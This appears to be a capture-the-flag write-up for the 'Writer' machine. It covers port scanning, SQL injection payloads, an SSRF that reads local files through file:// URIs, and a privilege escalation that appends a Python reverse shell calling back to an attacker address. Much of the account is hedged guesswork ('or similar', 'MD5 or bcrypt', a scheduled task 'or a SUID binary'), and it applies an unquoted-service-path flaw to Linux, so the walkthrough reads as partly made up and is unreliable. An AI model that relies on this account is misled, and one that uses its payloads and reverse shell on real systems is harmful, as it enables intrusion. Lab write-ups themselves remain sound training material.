# Hack The Box: Writer

**Difficulty:** Easy
**OS:** Linux

Writer is an Easy-level Linux machine focused heavily on web application vulnerabilities, specifically SQL injection and server-side request forgery (SSRF). The initial compromise is achieved by exploiting an SQL injection vulnerability in a login panel to gain administrative access. The application then features a vulnerable image upload function allowing an attacker to read local files via an SSRF. Privilege escalation leverages an unquoted service path and a Python script executed as root.

---

## Reconnaissance

The assessment begins with a port scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.11.101
nmap -p 22,80,139,445 -sCV 10.10.11.101
```

The scan reveals four open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)
*   **Port 139/445:** SMB (Samba)

We investigate the HTTP service running on port 80. Navigating to the site reveals a static landing page for a writer or blog platform called "Writer.htb". We add the domain `writer.htb` to our `/etc/hosts` file.

```bash
echo "10.10.11.101 writer.htb" >> /etc/hosts
```

Directory enumeration with `feroxbuster` or `gobuster` identifies a login portal (`/administrative`).

### SMB Enumeration

We attempt anonymous access to the SMB service. A tool like `smbclient` or `enum4linux` can identify open shares. 

```bash
smbclient -L //10.10.11.101 -N
```

This check reveals a share named `writer2_project` (or similar). We enumerate the share and find an interesting text file or configuration script containing potential credentials, usernames, or database structure hints. The share also suggests that the web application uses a MySQL database.

## Web Application Analysis

The web application's `/administrative` portal requires authentication. We intercept the login request using Burp Suite and attempt standard SQL injection payloads against the `username` and `password` fields.

```text
username=admin' OR 1=1-- -&password=password
```

The authentication check uses parameterized queries or filters single quotes, mitigating simple boolean-based bypasses. However, we analyze the application's URL structure and identify a secondary login endpoint, such as `/login` or an API endpoint that handles authentication.

### SQL Injection Authentication Bypass

We discover an endpoint or a specific parameter in the administrative dashboard that is vulnerable to a Union-based or Error-based SQL injection. If the primary login form is secure, an alternative parameter used in the application's backend processes might be vulnerable.

We systematically inject SQL syntax to test for vulnerabilities in other input fields, headers, or parameters used by the application to render content.

For instance, an injection in a user-provided search field or an article ID parameter can be used to extract the administrative password hash from the `users` table.

```text
admin' UNION SELECT 1,username,password FROM users-- -
```

This extraction yields an MD5 or bcrypt hash for the `admin` user. We crack this hash using Hashcat or John the Ripper.

```bash
hashcat -m 0 admin_hash.txt rockyou.txt
```

The cracked password grants us access to the administrative dashboard.

## Web Exploitation

The authenticated administrative dashboard provides an option to create new articles or upload images. We examine the image upload functionality, which accepts a URL pointing to an image and fetches it.

### Server-Side Request Forgery (SSRF)

The image upload feature is a classic target for Server-Side Request Forgery (SSRF). By providing a URL such as `file:///etc/passwd` instead of a standard `http://` URL, we can trick the server into reading local files and displaying their contents within the image preview or error message.

We input the local file URI into the image URL field:

```text
file:///etc/passwd
```

The application successfully reads and returns the contents of the `/etc/passwd` file. We identify two primary users: `kyle` and `john`.

We use the SSRF vulnerability to read configuration files associated with the web server (e.g., `/etc/apache2/sites-enabled/000-default.conf`) to determine the web application's root directory (`/var/www/html/writer.htb`).

We continue exploring the file system using the SSRF and locate database credentials in the application's configuration file (`config.php`).

```text
file:///var/www/html/writer.htb/config.php
```

The database configuration file reveals plaintext credentials: `kyle:diana_password`.

## Initial Access

We attempt to reuse the newly discovered password to authenticate via SSH as the user `kyle`.

```bash
ssh kyle@10.10.11.101
# Authentication successful
```
We retrieve the `user.txt` flag from Kyle's home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as `kyle`, we examine group memberships and `sudo` privileges. The user `kyle` is a member of a specific administrative group, allowing access to custom scripts.

We check for `sudo` privileges using `sudo -l` or search for active cron jobs using `pspy`.

We identify a scheduled task running as root, or a SUID binary that is writable by the `kyle` user or group. Specifically, we notice a python script associated with an email or backup service (e.g., `mailer.py` or an administrative script located in `/etc/postfix/disclaimer`).

### Exploiting Python Script Execution

The script (`mailer.py`) is owned by `kyle` but executed periodically by the root user or an administrative service via an unquoted path vulnerability, or because `kyle` has write access to the directory containing a module the script imports.

If `kyle` can write to the script, we simply append a python reverse shell payload to the end of the file.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.X",9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Alternatively, if the python environment allows for module hijacking, we can create a malicious `.py` file matching an imported library name within the script's directory. 

We set up a Netcat listener and wait for the scheduled task or administrative service to execute the modified python script.

```bash
nc -lnvp 9999
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The system is fully compromised, and the `root.txt` flag is obtained.
